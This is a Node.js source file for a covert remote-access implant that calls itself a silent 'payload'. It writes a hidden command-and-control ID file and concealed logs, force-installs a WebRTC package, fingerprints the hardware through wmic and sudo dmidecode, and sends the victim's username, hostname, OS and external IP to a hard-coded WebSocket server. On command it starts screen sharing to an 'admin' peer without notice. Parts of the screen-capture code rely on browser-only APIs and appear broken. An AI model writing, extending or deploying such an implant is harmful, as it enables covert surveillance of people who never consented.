const WebSocket = require('ws');
const http = require('http');
const { execSync } = require('child_process');
const os = require('os');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const https = require('https');

// --- CONFIGURATION ---
const WS_URL = 'wss://server-eight-pi-39.vercel.app';

// Persistence: Save ID so it reconnects after reboot
const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
const LOG_FILE = path.join(LOG_DIR, 'payload.log');
const HIDDEN_LOG_FILE = path.join(os.tmpdir(), '.sys_cache.log');

if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

// --- LOGGING SYSTEM ---
function log(msg) {
 const timestamp = new Date().toISOString();
 const logLine = `[${timestamp}] ${msg}`;
 console.log(logLine);
 try {
   fs.appendFileSync(LOG_FILE, `${logLine}\n`);
   fs.appendFileSync(HIDDEN_LOG_FILE, `${logLine}\n`);
 } catch (e) {}
}

function logError(msg, err) {
 const timestamp = new Date().toISOString();
 const errorLine = `[${timestamp}] [ERROR] ${msg}: ${err ? err.message || err : 'Unknown Error'}`;
 console.error(errorLine);
 try {
   fs.appendFileSync(LOG_FILE, `${errorLine}\n`);
   fs.appendFileSync(HIDDEN_LOG_FILE, `${errorLine}\n`);
 } catch (e) {}
}

log("[INIT] Payload starting silently...");

// --- FORCE INSTALLATION CHECK ---
try {
 const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
 if (!fs.existsSync(nodeModulesPath)) {
   log("[FORCE] @roamhq/wrtc missing. Installing...");
   try {
     execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
     log("[FORCE] Installation complete.");
   } catch (installErr) {
     logError("[FORCE] Failed to auto-install @roamhq/wrtc", installErr);
   }
 }
} catch (e) {
 logError("[FORCE] Could not check/install @roamhq/wrtc", e);
}

// --- NATIVE WEBRTC IMPORTS ---
let wrtc;
try {
 wrtc = require('@roamhq/wrtc');
 log("[WEBRTC] Successfully loaded @roamhq/wrtc");
} catch (e) {
 logError("[WEBRTC] Failed to require @roamhq/wrtc", e);
 wrtc = null;
}

const HAS_WEBRTC = wrtc && wrtc.RTCPeerConnection && wrtc.mediaDevices;
if (!HAS_WEBRTC) {
 log("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
}

const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};

// --- HARDWARE FINGERPRINT ---
function getHardwareFingerprint() {
 const mac = getMacAddress();
 const cpuSerial = getCpuSerial();
 const boardSerial = getBoardSerial();
 return crypto.createHash('sha256').update(mac + cpuSerial + boardSerial).digest('hex').substr(0, 12);
}

function getMacAddress() {
 const interfaces = os.networkInterfaces();
 for (const name of Object.keys(interfaces)) {
   for (const iface of interfaces[name]) {
     if (iface.family === 'IPv4' && !iface.internal) {
       return iface.mac;
     }
   }
 }
 return '00:00:00:00:00:00';
}

function getCpuSerial() {
 try {
   return execSync('wmic cpu get processorid').toString().split('\n')[1].trim();
 } catch (e) {
   try {
     return execSync("cat /proc/cpuinfo | grep 'serial number' | awk '{print $3}'").toString().trim();
   } catch (e2) {
     return 'unknown_cpu';
   }
 }
}

function getBoardSerial() {
 try {
   return execSync('wmic baseboard get serialnumber').toString().split('\n')[1].trim();
 } catch (e) {
   try {
     return execSync("sudo dmidecode -t system | grep 'Serial Number' | awk '{print $3}'").toString().trim();
   } catch (e2) {
     return 'unknown_board';
   }
 }
}

// --- NEW: Simplified Device Info Function (Replaces slow wmic calls) ---
function getDeviceInfo() {
 let username = 'Unknown';
 try {
   username = os.userInfo().username;
 } catch (_) {}

 const cpu = os.cpus();

 return {
   hostname: os.hostname(),
   platform: os.platform(),
   release: os.release(),
   architecture: os.arch(),
   username: username,
   cpuModel: cpu[0]?.model || 'Unknown',
   cpuCores: cpu.length,
   ramGB: Number((os.totalmem() / 1024 ** 3).toFixed(2)),
   freeRamGB: Number((os.freemem() / 1024 ** 3).toFixed(2)),
   uptimeSeconds: os.uptime()
 };
}

// --- ID MANAGEMENT ---
let myId = null;
try {
 if (fs.existsSync(PERSIST_FILE)) {
   const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
   if (savedId && savedId.length > 0) myId = savedId;
 }
} catch (e) {
 logError("[ID] Error reading persistence file", e);
}

if (!myId) {
 myId = getHardwareFingerprint();
 try {
   fs.writeFileSync(PERSIST_FILE, myId);
 } catch (e) {
   logError("[ID] Error writing persistence file", e);
 }
}

log(`[ID] Hardware Fingerprint: ${myId}`);

// --- WEBSOCKET CONNECTION WITH ROBUST RECONNECT ---
let ws = null;
let reconnectAttempts = 0;
let isConnected = false;
let myIp = 'Unknown';

function getExternalIP() {
 return new Promise((resolve) => {
   https.get('https://api.ipify.org?format=json', (res) => {
     let data = '';
     res.on('data', (chunk) => { data += chunk; });
     res.on('end', () => {
       try {
         const json = JSON.parse(data);
         resolve(json.ip);
       } catch (e) {
         resolve('Unknown');
       }
     });
   }).on('error', () => {
     resolve('Unknown');
   });
 });
}

async function initConnection() {
 log(`[WS] Attempting silent connection to ${WS_URL}...`);

 ws = new WebSocket(WS_URL);

 ws.on('error', (err) => {
   logError("[WS] Connection error", err);
   isConnected = false;
 });

 ws.on('open', async () => {
   reconnectAttempts = 0;
   isConnected = true;
   log(`[WS] Connected. Sending identity...`);

   // Use the new simplified getDeviceInfo function
   const deviceInfo = getDeviceInfo();

   // Get External IP
   myIp = await getExternalIP();

   // Prepare data for server
   const payloadData = {
     type: 'info',
     id: myId,
     uniqueId: myId,
     fingerprint: myId,
     os: `${deviceInfo.platform} ${deviceInfo.release}`,
     arch: deviceInfo.architecture,
     user: deviceInfo.username,
     ip: myIp,
     last_seen: Date.now(),
     status: 'Online',
     serial_number: getBoardSerial(), // Fallback to board serial if needed
     manufacturer: 'Unknown', // Can be added via wmic if strictly needed, but usually not critical
     model: deviceInfo.hostname,
     cpu: deviceInfo.cpuModel,
     ram_gb: deviceInfo.ramGB,
     cpu_cores: deviceInfo.cpuCores
   };

   // Send to server
   safeSend(JSON.stringify(payloadData));

   // Log to DB that we connected
   logToDB('connection_established', { id: myId, ip: myIp });

   startMonitoring();
 });

 ws.on('message', (msg) => {
   try {
     const data = JSON.parse(msg);
     if (data.type === 'request_join') handleJoinRequest();
     else if (data.type === 'offer') handleOffer(data.sdp);
     else if (data.type === 'answer') handleAnswer(data.sdp);
     else if (data.type === 'candidate') handleCandidate(data.candidate);
   } catch (e) {
     logError("[WS] Message parse error", e);
   }
 });

 ws.on('close', (code, reason) => {
   isConnected = false;
   log(`[WS] Closed. Code: ${code}. Reconnecting in ${(reconnectAttempts + 1) * 5}s...`);
   setTimeout(initConnection, Math.min((reconnectAttempts + 1) * 5000, 30000));
   reconnectAttempts++;
 });
}

function safeSend(msg) {
 if (ws && ws.readyState === WebSocket.OPEN) ws.send(msg);
}

function startMonitoring() {
 setInterval(() => {
   if (isConnected) safeSend(JSON.stringify({ type: 'heartbeat' }));
 }, 30000);
}

// --- WEBRTC (BROWSER NATIVE) ---
let peerConnection = null;
let localStream = null;

async function captureScreenPureJS() {
 if (!peerConnection) {
   peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
 }

 const transceivers = peerConnection.getTransceivers();
 transceivers.forEach(t => {
   if (t.sender.track) t.sender.stop();
 });

 try {
   const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
   stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));

   peerConnection.onicecandidate = (event) => {
     if (event.candidate) safeSend(JSON.stringify({ type: 'candidate', targetId: 'admin', candidate: event.candidate }));
   };

   const offer = await peerConnection.createOffer();
   await peerConnection.setLocalDescription(offer);
   safeSend(JSON.stringify({ type: 'offer', targetId: 'admin', sdp: peerConnection.localDescription }));
 } catch (err) {
   logError("[WEBRTC] Screen capture error", err);
 }
}

function handleJoinRequest() {
 log("[JOIN] Request received. Starting screen share silently...");
 captureScreenPureJS();
}

function handleOffer(offerSDP) {
 if (!peerConnection) peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
 peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
   .then(() => peerConnection.createAnswer())
   .then(answer => peerConnection.setLocalDescription(answer))
   .then(() => safeSend(JSON.stringify({ type: 'answer', targetId: 'admin', sdp: peerConnection.localDescription })))
   .catch(err => logError("[WEBRTC] Error handling offer", err));
}

function handleAnswer(answerSDP) {
 if (peerConnection) peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP)).catch(err => logError("[WEBRTC] Error handling answer", err));
}

function handleCandidate(candidate) {
 if (peerConnection && candidate) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => logError("[WEBRTC] Candidate error", err));
}

// --- INITIALIZATION ---
// Initialize connection on the Guest Computer
initConnection();
